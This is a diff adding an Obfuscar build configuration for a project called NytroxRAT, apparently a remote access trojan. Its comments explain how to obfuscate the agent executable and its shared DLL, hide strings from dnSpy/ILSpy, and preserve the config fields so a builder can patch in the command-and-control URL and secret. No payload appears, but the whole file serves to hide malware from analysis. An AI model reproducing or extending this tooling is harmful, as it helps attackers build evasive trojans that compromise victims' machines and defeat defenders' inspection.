@@ -1,0 +1,69 @@
+<?xml version='1.0'?>
+<Obfuscator>
+    <!--
+        NytroxRAT Agent — Obfuscar Configuration
+        ==========================================
+        Install (one time):
+            dotnet tool install -g obfuscar
+
+        Run manually from the Agent folder:
+            obfuscar.console obfuscar.xml
+
+        Or it runs automatically on Release build if you add the
+        MSBuild target in NytroxRAT.Agent.csproj (see below).
+
+        Output: Agent\bin\Release\net9.0-windows\Obfuscated\NytroxRAT.Agent.exe
+    -->
+
+    <Var name="InPath"  value=".\bin\Release\net9.0-windows" />
+    <Var name="OutPath" value=".\bin\Release\net9.0-windows\Obfuscated" />
+
+    <!-- ── Rename everything ───────────────────────────────────────────── -->
+    <Var name="RenameFields"      value="true" />
+    <Var name="RenameProperties"  value="true" />
+    <Var name="RenameMethods"     value="true" />
+    <Var name="RenameEvents"      value="true" />
+    <Var name="RenameTypes"       value="true" />
+
+    <!-- Use short ugly names like a, b, A0, b1 instead of readable ones -->
+    <Var name="UseUnicodeNames"   value="false" />
+
+    <!-- Encrypt string literals so they aren't readable in dnSpy/ILSpy -->
+    <Var name="HideStrings"       value="true" />
+
+    <!-- Suppress XML docs and extra metadata -->
+    <Var name="KeepPublicApi"     value="false" />
+    <Var name="HidePrivateApi"    value="true" />
+
+    <Module file="$(InPath)\NytroxRAT.Agent.exe">
+
+        <!-- ── CRITICAL: preserve AgentConfig exactly as-is ─────────────
+             The Builder finds NYTXURL: and NYTXSEC: by scanning raw bytes.
+             If Obfuscar renames fields or reorders the data section,
+             those byte tags shift and binary patching silently fails.
+             This skip applies to the type AND all its members.           -->
+        <SkipType  name="NytroxRAT.Agent.AgentConfig" />
+        <SkipField type="NytroxRAT.Agent.AgentConfig" name="UrlField" />
+        <SkipField type="NytroxRAT.Agent.AgentConfig" name="SecretField" />
+
+        <!-- ── Preserve async state machine names ───────────────────────
+             .NET async methods generate compiler-created classes.
+             Obfuscar can break them if it renames the state machine type
+             while the MoveNext method still references the old name.     -->
+        <SkipStringHiding name=".*MoveNext.*" isRegex="true" />
+
+        <!-- ── Preserve JSON property names ─────────────────────────────
+             System.Text.Json matches property names by string at runtime.
+             If Obfuscar renames C# properties, serialization breaks.
+             Skip all Packet model types in the Shared assembly.         -->
+
+    </Module>
+
+    <!-- Also obfuscate the shared models DLL -->
+    <Module file="$(InPath)\NytroxRAT.Shared.dll">
+        <!-- Keep packet model properties readable for JSON serialization -->
+        <SkipNamespace name="NytroxRAT.Shared.Models" />
+        <!-- Crypto helpers can be fully obfuscated -->
+    </Module>
+
+</Obfuscator>
